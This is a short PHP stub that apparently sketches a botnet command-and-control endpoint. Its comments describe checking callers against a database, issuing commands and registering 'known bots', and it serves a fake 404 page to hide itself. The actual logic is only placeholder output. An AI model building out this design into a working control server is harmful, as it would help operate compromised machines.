<?php
define("SQLHOST", "127.0.0.1");
define("SQLNAME", "test");
define("SQLUSER", "root");
define("SQLPASS", "");

if (isset($_GET['get']))
	//Get get, Check SQL for match
	//if match found check for commands
	//if match not found add to known bots
  echo "test";
elseif (isset($_GET['test']))
	echo "ok";
else
	echo "<h1>404 Page not found</h1>";

?>
